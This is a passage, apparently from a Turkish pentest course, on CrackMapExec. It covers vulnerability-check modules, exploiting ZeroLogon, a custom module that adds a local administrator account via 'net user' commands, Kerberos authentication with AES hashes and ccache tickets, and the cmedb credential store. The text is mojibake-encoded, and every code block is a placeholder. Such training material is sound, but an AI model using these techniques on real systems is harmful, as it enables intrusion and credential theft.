GÃ¼venlik aÃ§Ä±ÄŸÄ± tarama modÃ¼llerinin Ã§oÄŸu yazarÄ±, bilgisayarÄ±n gÃ¼venlik aÃ§Ä±ÄŸÄ± olup olmadÄ±ÄŸÄ±na dair bir mesaj eklememiÅŸtir, bu nedenle komut Ã§alÄ±ÅŸtÄ±rÄ±ldÄ±ktan sonra hiÃ§bir ÅŸey gÃ¶rmeyiz. Ancak, ( `./CrackMapExec/cme/modules/shadowcoerce.py`) adresinde bulunan shadowcoerse modÃ¼lÃ¼nÃ¼n kaynak kodunu kontrol edersek, yazarÄ±n ( `logging.debug` ) ile bazÄ± debug log'larÄ± eklediÄŸini gÃ¶receÄŸiz. CrackMapExec'i hata debug modunda Ã§alÄ±ÅŸtÄ±rÄ±rsak, bu loglarÄ± yazdÄ±racaktÄ±r.

CrackMapExec'i debug modunda Ã§alÄ±ÅŸtÄ±rmak iÃ§in protokolden Ã¶nce `--verbose` seÃ§eneÄŸini kullanabiliriz


### shadowcoerce ModÃ¼lÃ¼nÃ¼ Verbose Enabled ile Ã‡alÄ±ÅŸtÄ±rma

{{CODE_BLOCK_225}}


`DEBUG` ile baÅŸlayan satÄ±rlar `logging.debug`'a karÅŸÄ±lÄ±k gelir. Son satÄ±rlarda hedefin savunmasÄ±z olmadÄ±ÄŸÄ±nÄ± gÃ¶sterdiÄŸini gÃ¶rebiliriz.


### MS17-010 (EternalBlue)

MS17-010, diÄŸer adÄ±yla EternalBlue, Windows iÅŸletim sistemleri iÃ§in Microsft tarafÄ±ndan 14 Mart 2017 tarihinde yayÄ±nlanan bir gÃ¼venlik yamasÄ±dÄ±r. Yama, SMB servisindeki kritik bir kimliÄŸi doÄŸrulanmamÄ±ÅŸ remote kod Ã§alÄ±ÅŸtÄ±rma aÃ§Ä±ÄŸÄ± iÃ§indir. Bu gÃ¼venlik aÃ§Ä±ÄŸÄ± hakkÄ±nda daha fazla bilgi edinmek iÃ§in [Microsoft GÃ¼venlik BÃ¼lteni MS17-010](https://learn.microsoft.com/en-us/security-updates/SecurityBulletins/2017/ms17-010?redirectedfrom=MSDN) - Kritik'i okuyabiliriz.

CrackMapExec, bir domain controller'Ä±n MS17-010'a karÅŸÄ± savunmasÄ±z olup olmadÄ±ÄŸÄ±nÄ± belirleyen ms17-010 adlÄ± bir modÃ¼l iÃ§erir.


### MS17-010 Vulnerability Check

{{CODE_BLOCK_226}}


### GÃ¼venlik AÃ§Ä±ÄŸÄ±ndan Yararlanma

BirÃ§ok gÃ¼venlik aÃ§Ä±ÄŸÄ± gÃ¶rdÃ¼k. Onlardan birini exploit etmeye Ã§alÄ±ÅŸalÄ±m: ZeroLogon. ModÃ¼l tarafÄ±ndan saÄŸlanan baÄŸlantÄ±ya gidelim https://github.com/dirkjanm/CVE-2020-1472 ve onu kullanalÄ±m:


### Exploiting ZeroLogon

{{CODE_BLOCK_227}}

{{CODE_BLOCK_228}}


Zaman geÃ§tikÃ§e yeni gÃ¼venlik aÃ§Ä±klarÄ± ortaya Ã§Ä±kacaktÄ±r ve bunlar sektÃ¶r uzmanlarÄ± veya bizim tarafÄ±mÄ±zdan CrackMapExec'e modÃ¼l olarak eklenebilir. Bir sonraki bÃ¶lÃ¼mde, CrackMapExec iÃ§in nasÄ±l bir modÃ¼l oluÅŸturabileceÄŸimizi gÃ¶receÄŸiz.

---

### Kendi CME ModÃ¼lÃ¼mÃ¼zÃ¼ OluÅŸturmak

Yazarlar ve topluluk tarafÄ±ndan oluÅŸturulan birÃ§ok yerleÅŸik CrackMapExec modÃ¼lÃ¼nÃ¼ kullandÄ±k. Bu bÃ¶lÃ¼mde CrackMapExec iÃ§in modÃ¼lÃ¼mÃ¼zÃ¼ nasÄ±l yapabileceÄŸimizi keÅŸfedeceÄŸiz.


### CrackMapExec'i Poetry ile derleyin

ModÃ¼lÃ¼mÃ¼zÃ¼ oluÅŸturmadan Ã¶nce, CrackMapExec projesinin nasÄ±l derleneceÄŸini bilmek Ã§ok Ã¶nemlidir. Bu amaÃ§la CME, projelerimizi oluÅŸtururken Ã¶nerilen [Poetry](https://python-poetry.org/)'yi kullanÄ±r. Poetry kullanmÄ±yorsanÄ±z, CrackMapExec'i Ã§alÄ±ÅŸtÄ±rmak Ã¼zere Poetry kullanmaya baÅŸlamak iÃ§in Kurulum ve Binaryler bÃ¶lÃ¼mÃ¼ne bir gÃ¶z atÄ±n

Åimdi kodu en sevdiÄŸimiz IDE ile aÃ§abiliriz. Bu bÃ¶lÃ¼mde [VSCode](https://code.visualstudio.com/) kullanacaÄŸÄ±z. VSCode'u [kurmak](https://code.visualstudio.com/download) iÃ§in .deb dosyasÄ±nÄ± kendi web sitesinden indirmemiz gerekiyor. DoÄŸrudan indirme baÄŸlantÄ±sÄ± [burada](https://code.visualstudio.com/sha/download?build=stable&os=linux-deb-x64).


### VSCode'un KurulmasÄ± ve Ã‡alÄ±ÅŸtÄ±rÄ±lmasÄ±

{{CODE_BLOCK_229}}

Daha sonra aÃ§mak iÃ§in `code` yazabiliriz 

{{CODE_BLOCK_230}}

![Pasted image 20241203150456.png](/img/user/resimler/Pasted%20image%2020241203150456.png)


### Yeni ModÃ¼lÃ¼mÃ¼zÃ¼ OluÅŸturun

ModÃ¼lÃ¼mÃ¼zÃ¼ oluÅŸturalÄ±m. Yeni bir administrator hesabÄ± oluÅŸturacak basit bir script oluÅŸturacaÄŸÄ±z.

* ./CrackMapExec/cme/modules klasÃ¶rÃ¼ altÄ±nda `createadmin.py` adÄ±nda bir dosya oluÅŸturun.
* AÅŸaÄŸÄ±daki kod Ã¶rneÄŸini dosyaya kopyalayÄ±n:

{{CODE_BLOCK_231}}



* Åimdi modÃ¼lÃ¼mÃ¼zÃ¼ Ã¶zelleÅŸtirelim.

BazÄ± deÄŸiÅŸkenleri tanÄ±mlamamÄ±z gerekiyor:

* `name`, modÃ¼l adÄ±nÄ± nasÄ±l Ã§aÄŸÄ±racaÄŸÄ±mÄ±zÄ± belirtir. Bu durumda, `createadmin` dosya adÄ±nÄ± kullanacaÄŸÄ±z.
* `description` modÃ¼lÃ¼n amacÄ± iÃ§in kÄ±sa bir aÃ§Ä±klamadÄ±r. Biz bunu `Create a new administrator account` ayarlayacaÄŸÄ±z.
* `supported_protocols`, modÃ¼lÃ¼ kullanmak iÃ§in desteklenen protokolÃ¼n bir dizisidir. Biz sadece `SMB` kullanacaÄŸÄ±z.
* `opsec_safe`, modÃ¼lÃ¼n Ã§alÄ±ÅŸtÄ±rÄ±lmasÄ±nÄ±n gÃ¼venli olduÄŸu anlamÄ±na gelen bir `True` veya `False` deÄŸeridir.
* `multiple_hosts`, bu modÃ¼lÃ¼ birden fazla hedefe karÅŸÄ± Ã§alÄ±ÅŸtÄ±rabileceÄŸimiz anlamÄ±na gelir.

AyrÄ±ca, modÃ¼l iÃ§in deÄŸiÅŸkenleri tanÄ±mlamak iÃ§in kullanÄ±lan `options()` methoduna da sahip olacaÄŸÄ±z. Bu durumda, `USER` ve `PASS` olmak Ã¼zere iki seÃ§enek ekleyeceÄŸiz. Her seÃ§eneÄŸin varsayÄ±lan deÄŸeri olabilir ya da olmayabilir. Bu yazara baÄŸlÄ±dÄ±r. USER iÃ§in varsayÄ±lan deÄŸeri dÃ¼z metin olarak ve PASS iÃ§in varsayÄ±lan deÄŸeri `asdasd123` . AyrÄ±ca USER o PASS modÃ¼l seÃ§eneÄŸinin boÅŸ olup olmadÄ±ÄŸÄ±nÄ± doÄŸrulamak iÃ§in bir kontrol ekledik. EÄŸer durum buysa, modÃ¼lden Ã§Ä±kÄ±lacaktÄ±r.

{{CODE_BLOCK_232}}

* Daha sonra, `on_admin_login()` metodunu kullanarak execute ile Ã§alÄ±ÅŸacaÄŸÄ±z. Bu metot deÄŸiÅŸkenlerimizi almaktan ve hedeflere istediÄŸimiz herhangi bir gÃ¶revi yÃ¼rÃ¼tmekten sorumludur. Ã‡Ä±ktÄ± olarak `context.log.info` ve `context.log.highlight` metotlarÄ±nÄ± kullanacaÄŸÄ±z (farklÄ± renklere sahipler).

Bu execute iÃ§in, yÃ¶ntemin `connection.execute(command, True)` komutunu kullanarak bir `cmd.exe` komutu Ã§alÄ±ÅŸtÄ±racaÄŸÄ±z. Komutumuz, yeni bir kullanÄ±cÄ± eklemek iÃ§in `net user username password /add /Y` deÄŸeriyle ve kullanÄ±cÄ±yÄ± administrators grubuna eklemek iÃ§in `net localgroup administrators username /add` deÄŸeriyle command deÄŸiÅŸkenine kaydedilecektir.

{{CODE_BLOCK_233}}


Son olarak, yeni modÃ¼lÃ¼mÃ¼z ÅŸu ÅŸekilde gÃ¶rÃ¼nmelidir:

{{CODE_BLOCK_234}}


### ModÃ¼lÃ¼mÃ¼zÃ¼ Ã‡alÄ±ÅŸtÄ±rma

Åimdi modÃ¼lÃ¼mÃ¼zÃ¼ herhangi bir seÃ§enekle veya herhangi bir seÃ§enek olmadan Ã§alÄ±ÅŸtÄ±rabiliriz. Ã–nce varsayÄ±lan deÄŸerlerle Ã§alÄ±ÅŸtÄ±rarak sonuÃ§larÄ± gÃ¶relim.


### CME ModÃ¼lÃ¼mÃ¼zÃ¼n Ã‡alÄ±ÅŸtÄ±rÄ±lmasÄ± createadmin

{{CODE_BLOCK_235}}

Daha sonra, hem kullanÄ±cÄ± adÄ± hem de parola belirterek Ã§alÄ±ÅŸtÄ±rabiliriz.

{{CODE_BLOCK_236}}


Ä°lk modÃ¼lÃ¼mÃ¼z Ã§alÄ±ÅŸÄ±yor, ancak Ã§ok daha iyi olabilir. YÃ¼rÃ¼tmeyi iki komuta bÃ¶lebilir ve kullanÄ±cÄ± zaten oluÅŸturulmuÅŸsa veya ÅŸifre politikalara uymuyorsa bir hata gÃ¶sterebiliriz.

AyrÄ±ca `context.log.highlight(p)`'den deÄŸeri alabilir ve bir hata varsa farklÄ± bir ÅŸey gÃ¶sterebiliriz. Bu kodu geliÅŸtirmek iÃ§in fikirleriniz nelerdir?

### DiÄŸer Yazarlardan Ã–ÄŸrenmek

ArtÄ±k yeni bir modÃ¼l oluÅŸturmanÄ±n temellerini Ã¶ÄŸrendiÄŸimize gÃ¶re, diÄŸer modÃ¼lleri keÅŸfetmeli ve birkaÃ§ fikir edinmeliyiz.

Ã–rneÄŸin, `procdump.py` modÃ¼lÃ¼ `procdump.exe` Ã§alÄ±ÅŸtÄ±rÄ±labilir dosyasÄ±nÄ± bir `Base64` string olarak kaydeder, ardÄ±ndan Base64 stringini bir dosyaya dÃ¶nÃ¼ÅŸtÃ¼rÃ¼r ve hedef iÅŸletim sisteminde tutar. LSASS'Ä±n iÅŸlem kimliÄŸini almak iÃ§in `tasklist` komutunu Ã§alÄ±ÅŸtÄ±rÄ±r, bunu bir deÄŸiÅŸkene kaydeder ve process kimliÄŸini procdump.exe'nin yÃ¼rÃ¼tÃ¼lmesine bir argÃ¼man olarak geÃ§irir.

BaÅŸka bir Ã¶rnek `get_description.py` . Bu modÃ¼lÃ¼ `groupmembership` modÃ¼lÃ¼nÃ¼ oluÅŸturmak iÃ§in Ã¶rnek olarak aldÄ±k. Bu modÃ¼l, bir sorgu gerÃ§ekleÅŸtirmek ve `memberOf` attribute'unu almak iÃ§in ihtiyaÃ§ duyduÄŸumuz gibi, sonuÃ§larÄ±nÄ± bir LDAP sorgusuna dayalÄ± olarak alÄ±r. Kodda bazÄ± deÄŸiÅŸiklikler yaptÄ±k, yeni bir modÃ¼l oluÅŸturduk ve bir pull request gÃ¶nderdik. Pull request kabul edildikten sonra tÃ¼m topluluk tarafÄ±ndan kullanÄ±labilir olacaktÄ±r.

Yeni modÃ¼ller oluÅŸturmak iÃ§in MSSQL gibi diÄŸer protokoller iÃ§in baÅŸka Ã¶rneklere de bakabiliriz.


### Pull Request OluÅŸturma

CrackMapExec gibi bir proje topluluk tarafÄ±ndan canlÄ± tutulur. ModÃ¼lÃ¼mÃ¼zÃ¼n tÃ¼m topluluk tarafÄ±ndan kullanÄ±labilir hale geleceÄŸi ve aracÄ±n kendisinin bir parÃ§asÄ± olarak dahil edileceÄŸi bir pull request'i ekleyerek projeye katkÄ±da bulunabiliriz.

Bir pull request'i yapmak iÃ§in [GitHub](https://docs.github.com/en/pull-requests/collaborating-with-pull-requests/proposing-changes-to-your-work-with-pull-requests/creating-a-pull-request) kÄ±lavuzunu takip edebilir ve CrackMapExec'e katkÄ±da bulunabiliriz.

Ä°lerleyen bÃ¶lÃ¼mlerde, CrackMapExec kullanÄ±mÄ± iÃ§in `IPv6`, `Kerberos Kimlik DoÄŸrulama` ve `CrackMapExec` veritabanÄ±nda uzmanlaÅŸma gibi bazÄ± bonus konularÄ± tartÄ±ÅŸacaÄŸÄ±z.


### Ek CME Ä°ÅŸlevselliÄŸi

CrackMapExec, Ã§eÅŸitli senaryolarda Ã§ok faydalÄ± olacak baÅŸka yardÄ±mcÄ± programlara da sahiptir. Bu bÃ¶lÃ¼mde, bunlardan Ã¼Ã§Ã¼nÃ¼ inceleyeceÄŸiz:

* Audit mode
* IPv6 desteÄŸi
* Birden fazla cihaza saldÄ±rÄ±rken tamamlanma yÃ¼zdesi

### Audit Mode

5.3.0 sÃ¼rÃ¼mÃ¼nde yeni bir mod eklendi: `audit modu`. Bu mod, ÅŸifreyi veya hash'i tercih ettiÄŸimiz bir karakterle veya hatta en sevdiÄŸimiz `emoji` ile deÄŸiÅŸtirir. Bu Ã¶zellik, bir mÃ¼ÅŸteri raporu yazarken ekran gÃ¶rÃ¼ntÃ¼sÃ¼nÃ¼n bulanÄ±klaÅŸmasÄ±nÄ± Ã¶nlemeye yardÄ±mcÄ± olur.

Audit modunu yapÄ±landÄ±rmak iÃ§in, varsayÄ±lan olarak `~/.cme/cme.conf` adresinde bulunan yapÄ±landÄ±rma dosyasÄ±nÄ± dÃ¼zenlememiz ve `audit_mode` parametresini tercih ettiÄŸimiz karakterle deÄŸiÅŸtirmemiz gerekir. Bu karakter, CrackMapExec Ã§alÄ±ÅŸtÄ±rÄ±lÄ±rken parolanÄ±n veya hash'in yerini alacaktÄ±r. Bu Ã¶rnek iÃ§in `#` karakterini kullanacaÄŸÄ±z


### Enabling Audit Mode

{{CODE_BLOCK_237}}

Åimdi Ã§alÄ±ÅŸtÄ±rabilir ve parolanÄ±n Ã§Ä±ktÄ±da `########` ile deÄŸiÅŸtirildiÄŸini gÃ¶rebiliriz.

{{CODE_BLOCK_238}}

GÃ¶rdÃ¼ÄŸÃ¼mÃ¼z gibi, Ã§alÄ±ÅŸtÄ±rma sonucundaki password `#` karakteri ile deÄŸiÅŸtirilir. Ancak, komut ÅŸifreyi gÃ¶sterir. Bu gibi durumlarda, istenen komutu Ã§alÄ±ÅŸtÄ±rmadan Ã¶nce parolayÄ± bir dosyaya kaydetmek idealdir.

### Audit Mode Dosyadaki Parola ile EtkinleÅŸtirildi

{{CODE_BLOCK_239}}


### IPv6 Support

CrackMapExec'in bir diÄŸer yeteneÄŸi, IPv6 Ã¼zerinden iletiÅŸimi desteklemesidir. Ã‡oÄŸu organizasyon, IPv6'yÄ± varsayÄ±lan olarak etkinleÅŸtirmiÅŸtir, hatta bunu kullanmasalar bile, IPv6'nÄ±n log seviyesinde IPv4 kadar izlenmediÄŸi veya anlaÅŸÄ±lmadÄ±ÄŸÄ± durumlar da olabilir. Bu durum, aÄŸ saldÄ±rÄ±larÄ±nÄ±n gerÃ§ekleÅŸtirilmesi ve tespit edilmeden geÃ§mesi iÃ§in bir fÄ±rsat yaratÄ±r.

PopÃ¼ler modÃ¼ller bÃ¶lÃ¼mÃ¼nde gÃ¶rdÃ¼ÄŸÃ¼mÃ¼z gibi, CrackMapExec, `get_netconnections` modÃ¼lÃ¼yle bilgisayarlarÄ±n IPv6 adreslerini belirlememize olanak tanÄ±r. Bu modÃ¼lÃ¼ kullanarak IPv6 Ã¼zerinden komutu Ã§alÄ±ÅŸtÄ±rmayÄ± deneyelim.

### get_netconnections ModÃ¼lÃ¼nÃ¼ Ã‡alÄ±ÅŸtÄ±rma ve IPv6 Kullanma

{{CODE_BLOCK_240}}

Åimdi IPv6 Ã¼zerinden hedefe eriÅŸelim.

{{CODE_BLOCK_241}}



### Tamamlanma YÃ¼zdesi

ArtÄ±k bir tarama Ã§alÄ±ÅŸÄ±rken enter tuÅŸuna basabilirsiniz ve CME size tamamlanma yÃ¼zdesini ve taranacak kalan host sayÄ±sÄ±nÄ± verecektir. Bu modÃ¼l laboratuvarÄ±nda her seferinde bir host'a saldÄ±rÄ±yoruz, ancak daha kapsamlÄ± bir aÄŸ bulduÄŸunuzda, bÃ¼yÃ¼k olasÄ±lÄ±kla bu Ã¶zelliÄŸi kullanacaksÄ±nÄ±z. Åimdilik `--shares` seÃ§eneÄŸini Ã§alÄ±ÅŸtÄ±ralÄ±m ve bitmeden Ã¶nce enter tuÅŸuna basalÄ±m.


### Tamamlanma YÃ¼zdesi

{{CODE_BLOCK_242}}

AÅŸaÄŸÄ±daki bÃ¶lÃ¼mde, Kerberos kimlik doÄŸrulamasÄ±nÄ± ve CrackMapExec'in bu kimlik doÄŸrulama yÃ¶ntemi iÃ§in iÃ§erdiÄŸi yeni deÄŸiÅŸiklikleri tartÄ±ÅŸacaÄŸÄ±z.

---


### Kerberos Authentication

Yazma sÄ±rasÄ±nda CrackMapEec, `SMB`, `LDAP` ve `MSSQL` protokolleri iÃ§in Kerberos Kimlik DoÄŸrulamasÄ±nÄ± desteklemektedir. Kerberos Kimlik DoÄŸrulamasÄ±nÄ± kullanmanÄ±n iki (2) yolu vardÄ±r:

* `ccache` dosyasÄ±nÄ± belirtmek iÃ§in `KRB5CCNAME` env adÄ±nÄ± kullanma. 
* CrackMapExec 5.4.0'dan baÅŸlayarak, artÄ±k Kerberos kimlik doÄŸrulamasÄ± iÃ§in bir Ticketla `KRB5CCNAME` environment variable'Ä±nÄ± kullanmamÄ±z gerekmiyor. Bir kullanÄ±cÄ± adÄ± ve parola veya kullanÄ±cÄ± adÄ± ve hash kullanabiliriz.

Linux'ta Kerberos kimlik doÄŸrulamasÄ±nÄ± kullanÄ±rken gÃ¶z Ã¶nÃ¼nde bulundurulmasÄ± gereken Ã¶nemli bir unsur, saldÄ±rdÄ±ÄŸÄ±mÄ±z bilgisayarÄ±n domain ve hedef makinenin `FQDN`'sini Ã§Ã¶zÃ¼mlemesi gerektiÄŸidir. Ä°nternal bir aÄŸdaysak, bilgisayarÄ±mÄ±zÄ± ÅŸirketin DNS'sine domain adÄ± Ã§Ã¶zÃ¼mlemeleri yapacak ÅŸekilde yapÄ±landÄ±rabiliriz, ancak durum bÃ¶yle deÄŸildir. DNS'i yapÄ±landÄ±ramayÄ±z ve `/etc/hosts` dosyasÄ±na domain controller ve hedef makinemiz iÃ§in FQDN'i manuel olarak eklememiz gerekecektir.


### Setting Up the /etc/hosts File

{{CODE_BLOCK_243}}

{{CODE_BLOCK_244}}

CrackMapExec'i Kerberos kimlik doÄŸrulamasÄ± ile kullanmayÄ± deneyelim.

### Username and Password - Kerberos Authentication

CrackMapExec'i `-k` veya `--kerberos` seÃ§eneÄŸi olmadan bir kullanÄ±cÄ± adÄ± ve parola veya kullanÄ±cÄ± adÄ± ve hash ile kullandÄ±ÄŸÄ±mÄ±zda, NTLM kimlik doÄŸrulamasÄ± gerÃ§ekleÅŸtiririz. Kerberos seÃ§eneÄŸini kullanÄ±rsak bunun yerine Kerberos kimlik doÄŸrulamasÄ±nÄ± kullanabiliriz.

### Kerberos Authentication

{{CODE_BLOCK_245}}




### Kerberos Kimlik DoÄŸrulamasÄ± ile KullanÄ±cÄ±larÄ± TanÄ±mlama

Yeni Kerberos kimlik doÄŸrulama uygulamasÄ± ile CrackMapExec, CME iÃ§inde kendi `Kerbrute`'unu oluÅŸturmak iÃ§in tÃ¼m bileÅŸenlere sahiptir. Bu, CME'nin bir kullanÄ±cÄ±nÄ±n domain Ã¼zerinde var olup olmadÄ±ÄŸÄ±nÄ± ve bu kullanÄ±cÄ±nÄ±n Kerberos `pre-authentication` (`ASREPRoasting`) gerektirmeyecek ÅŸekilde yapÄ±landÄ±rÄ±lÄ±p yapÄ±landÄ±rÄ±lmadÄ±ÄŸÄ±nÄ± anlayabileceÄŸi anlamÄ±na gelir. Bunu aÅŸaÄŸÄ±daki hesaplarla Ã§alÄ±ÅŸÄ±rken gÃ¶relim: `account_not_exist` , `julio` , ve `robert` .


### Kerberos Kimlik DoÄŸrulamasÄ± ile KullanÄ±cÄ±larÄ± TanÄ±mlama

{{CODE_BLOCK_246}}

GÃ¶rdÃ¼ÄŸÃ¼mÃ¼z gibi, `Kerbrute` CrackMapExec TGT isteklerini Ã¶n kimlik doÄŸrulamasÄ± olmadan gÃ¶nderdiÄŸinden, KDC bir KDC_ERR_C_PRINCIPAL_UNKNOWN hatasÄ±yla yanÄ±t verirse, kullanÄ±cÄ± adÄ± mevcut deÄŸildir. Ancak, KDC pre-authentication isterse, `KDC_ERR_PREAUTH_FAILED` hatasÄ±yla yanÄ±t verir, bu da kullanÄ±cÄ± adÄ±nÄ±n mevcut olduÄŸu anlamÄ±na gelir. Son olarak, `asreproast` saldÄ±rÄ±sÄ±na karÅŸÄ± savunmasÄ±z bir hata hesabÄ± gÃ¶rÃ¼rsek, daha Ã¶nce `AESREPRoast` HesaplarÄ±nÄ± Bulma bÃ¶lÃ¼mÃ¼nde gÃ¶rdÃ¼ÄŸÃ¼mÃ¼z gibi AESREPoast saldÄ±rÄ±larÄ±na karÅŸÄ± hassastÄ±r.

Bu, oturum aÃ§ma hatalarÄ±na neden olmaz, bu nedenle herhangi bir hesabÄ± kilitlemez, ancak Kerberos logu etkinleÅŸtirilmiÅŸse [4768](https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventID=4768) numaralÄ± bir Windows olay kimliÄŸi oluÅŸturur.


### AES-128 veya AES-256 kullanma

AyrÄ±ca, Kerberos Kimlik DoÄŸrulamasÄ± iÃ§in AES-128 veya AES-256 hash'leri de kullanabiliriz. `Impacket`'ten `Secretsdump` gibi araÃ§lar, genellikle bu tÃ¼r hash'leri alabilir. AES-128 veya AES-256 kullandÄ±ÄŸÄ±mÄ±zda, trafiÄŸimiz normal Kerberos trafiÄŸine daha Ã§ok benzeyecek ve bu da operasyonel bir avantaj (opsec) saÄŸlayacaktÄ±r. Hadi Secretsdump'u kullanalÄ±m ve ardÄ±ndan AES256 ile kimlik doÄŸrulamasÄ± yapalÄ±m.


### AES256 ile Kimlik DoÄŸrulama

{{CODE_BLOCK_247}}

{{CODE_BLOCK_248}}


### CCache file - Kerberos Authentication

Bir credential cache (veya [ccache](https://web.mit.edu/kerberos/krb5-1.12/doc/basic/ccache_def.html) ) Kerberos kimlik bilgilerini tutar. Genellikle kullanÄ±cÄ±nÄ±n oturumu sÃ¼rdÃ¼ÄŸÃ¼ sÃ¼rece geÃ§erli kalÄ±rlar, bu nedenle servislere birden fazla kez kimlik doÄŸrulamasÄ± yapmak (Ã¶rneÄŸin, bir web veya posta sunucusuna birden fazla kez baÄŸlanmak) her seferinde KDC ile iletiÅŸim kurmayÄ± gerektirmez.

Ã‡oÄŸu durumda, Linux makineleri Kerberos tickerlarÄ± ccache dosyalarÄ± olarak depolar, sistemlerin ticketlarÄ± kullanma ÅŸekli, `ccache` dosyasÄ±nÄ±n yolunu gÃ¶steren `KRB5CCNAME` environment variable aracÄ±lÄ±ÄŸÄ±yla olur. robert kullanÄ±cÄ±sÄ± iÃ§in bir ticket (ccache dosyasÄ±) oluÅŸturalÄ±m ve DC01'e kimlik doÄŸrulamasÄ± yapalÄ±m

Ticket'Ä± oluÅŸturmak iÃ§in [getTGT.py](https://github.com/fortra/impacket/blob/master/examples/getTGT.py) impacket aracÄ±nÄ± kullanacaÄŸÄ±z ve KRB5CCNAME environment variable'i getTGT.py tarafÄ±ndan oluÅŸturulan ccache dosyasÄ±nÄ±n yoluna ayarlayacaÄŸÄ±z.


### Ticket Granting Tickets

{{CODE_BLOCK_249}}

{{CODE_BLOCK_250}}

Kerberos kimlik doÄŸrulama yÃ¶ntemimiz olarak `KRB5CCNAME` environment variable'ini kullanmak iÃ§in `--use-kcache` seÃ§eneÄŸini kullanmamÄ±z gerekir. KullanÄ±cÄ± adÄ± ve parola seÃ§enekleri gerekli deÄŸildir.


### ccache DosyasÄ±nÄ± Kerberos Kimlik DoÄŸrulama YÃ¶ntemi Olarak Kullanma (SMB ProtokolÃ¼)

{{CODE_BLOCK_251}}


### Kerberos Kimlik DoÄŸrulama YÃ¶ntemi Olarak ccache DosyasÄ±nÄ±n KullanÄ±lmasÄ± (LDAP ProtokolÃ¼)

{{CODE_BLOCK_252}}

Kerberos Kimlik DoÄŸrulamasÄ±nÄ± `MSSQL` protokolÃ¼ ile kullanmak iÃ§in hedef olarak IP adresi yerine bilgisayar adÄ±nÄ± veya FQDN'yi belirtmemiz gerekir. Bunun nedeni, MSSQL protokolÃ¼nÃ¼n perde arkasÄ±nda IP'yi FQDN'ye dÃ¶nÃ¼ÅŸtÃ¼rmemesi, ancak SMB ve LDAP protokollerinin bunu yapmasÄ±dÄ±r.


### MSSQL ProtokolÃ¼ ile ccache DosyasÄ±nÄ± Kullanma

{{CODE_BLOCK_253}}

KullanÄ±cÄ± adlarÄ± ve parolalarla yaptÄ±ÄŸÄ±mÄ±z gibi Kerberos kimlik doÄŸrulamasÄ± ile herhangi bir modÃ¼lÃ¼ veya seÃ§eneÄŸi Ã§alÄ±ÅŸtÄ±rabiliriz


### Kerberos Kimlik DoÄŸrulamasÄ± ile PaylaÅŸÄ±mlarÄ± Listeleme


{{CODE_BLOCK_254}}


CrackMapExec ile Kerberos Authentication'Ä±n nasÄ±l kullanÄ±lacaÄŸÄ±nÄ± Ã¶ÄŸrendik. AÅŸaÄŸÄ±daki bÃ¶lÃ¼mde, CrackMapExec veritabanÄ± `cmedb` ile etkileÅŸime gireceÄŸiz

---


### CMEDB'de UzmanlaÅŸmak

CME otomatik olarak tÃ¼m kullanÄ±lan/dump edilen kimlik bilgilerini (diÄŸer bilgilerle birlikte) ilk Ã§alÄ±ÅŸtÄ±rmada kurulan `SQLite` veritabanÄ±nda saklar. TÃ¼m Ã§alÄ±ÅŸma alanlarÄ± ve ilgili veritabanlarÄ± `~/.cme/workspaces` iÃ§inde saklanÄ±r. VarsayÄ±lan veritabanlarÄ± `~/.cme/workspaces/default` dizininde bulunur. Bu dizinde her protokol iÃ§in bir SQLite dosyasÄ± bulunur.


### VarsayÄ±lan VeritabanlarÄ±nÄ± Listeleme

{{CODE_BLOCK_255}}

### VeritabanÄ± ile EtkileÅŸim

CME, back-end veritabanÄ± ile etkileÅŸimi kolaylaÅŸtÄ±ran ikinci bir komut satÄ±rÄ± script'i olan `cmedb` ile birlikte gelir. cmedb komutunu yazmak bizi bir komut shell'i gÃ¶tÃ¼recektir:

### CMEDB

{{CODE_BLOCK_256}}


### Workspaces

VarsayÄ±lan workspace adÄ± `default` olarak adlandÄ±rÄ±lÄ±r (bilgi `prompt` gÃ¶sterildiÄŸi gibi). Bir workspace seÃ§ildiÄŸinde, CME'de yaptÄ±ÄŸÄ±mÄ±z her ÅŸey bu workspace'de saklanacaktÄ±r. Bir workspace oluÅŸturmak iÃ§in, `cmedb (default) >` komut promt root'una gitmemiz gerekir. EÄŸer protokol veritabanÄ±ndaysak, geri komutunu kullanmamÄ±z gerekir.


### Creating a Workspace

{{CODE_BLOCK_257}}

Workspace'leri listelemek iÃ§in `workspace list` , workspace'i deÄŸiÅŸtirmek iÃ§in ise `workspace <workspace>` yazabiliriz.


### Workspace'leri Listeleme ve DeÄŸiÅŸtirme

{{CODE_BLOCK_258}}


### Bir ProtokolÃ¼n VeritabanÄ±na EriÅŸim

cmedb her protokol iÃ§in bir veritabanÄ±na sahiptir, ancak bu modÃ¼lÃ¼n yazÄ±ldÄ±ÄŸÄ± sÄ±rada yalnÄ±zca `SMB` ve `MSSQL` yararlÄ± seÃ§eneklere sahiptir:

| Protokol | SeÃ§enekler                                         |
| -------- | -------------------------------------------------- |
| SMB      | back exit export import groups hosts import shares |
| MSSQL    | back exit export import host import                |
| LDAP     | back exit export import                            |
| WinRM    | back exit export import                            |
| RDP      | back exit export import                            |
| FTP      | back exit export import                            |
| SSH      | back exit export import                            |

Bir protokolÃ¼n veritabanÄ±na eriÅŸmek iÃ§in `proto` `<protocol>` komutunu Ã§alÄ±ÅŸtÄ±rÄ±n. Protokol iÃ§inde, mevcut seÃ§enekleri gÃ¶rÃ¼ntÃ¼lemek iÃ§in `help` seÃ§eneÄŸini kullanabiliriz:

### SMB Protokol VeritabanÄ±na BaÄŸlanma

{{CODE_BLOCK_259}}


### Protocol Options

SMB veya MSSQL protokolÃ¼nÃ¼ her kullandÄ±ÄŸÄ±mÄ±zda, kimlik bilgileri, saldÄ±rdÄ±ÄŸÄ±mÄ±z hostlar, eriÅŸtiÄŸimiz paylaÅŸÄ±mlar ve listelediÄŸimiz gruplar CrackMapExec veritabanÄ±nda saklanÄ±r. VeritabanÄ±nda sahip olduÄŸumuz verilere eriÅŸelim.

### Kimlik Bilgilerini GÃ¶rÃ¼ntÃ¼leme

CrackMapExec veritabanÄ±, CrackMapExec kullanarak kullandÄ±ÄŸÄ±mÄ±z veya elde ettiÄŸimiz tÃ¼m kimlik bilgilerini depolar. Bu veritabanÄ±, kimlik bilgilerinin tÃ¼rÃ¼nÃ¼, `dÃ¼z metin` veya `hash` olup olmadÄ±ÄŸÄ±nÄ±, domain, kullanÄ±cÄ± adÄ± ve ÅŸifreyi saklar. SMB protokolÃ¼nÃ¼n kimlik bilgilerini gÃ¶rmek iÃ§in protokol iÃ§indeki `creds` seÃ§eneÄŸini kullanmamÄ±z gerekir.


### Displaying SMB Credentials

